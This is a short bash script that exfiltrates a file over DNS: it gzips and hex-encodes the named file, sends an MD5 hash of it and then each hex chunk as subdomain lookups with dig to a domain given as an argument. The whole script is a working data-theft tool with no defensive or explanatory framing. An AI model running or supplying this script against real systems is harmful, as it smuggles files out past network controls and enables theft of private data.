#! /bin/bash

FILE=$1
DOMAIN=$2

dig `gzip -c $FILE | xxd -p | md5sum | cut -d ' ' -f1`.$DOMAIN;

for line in `gzip -c $FILE | xxd -p`; do
	dig $line.$DOMAIN;
done;
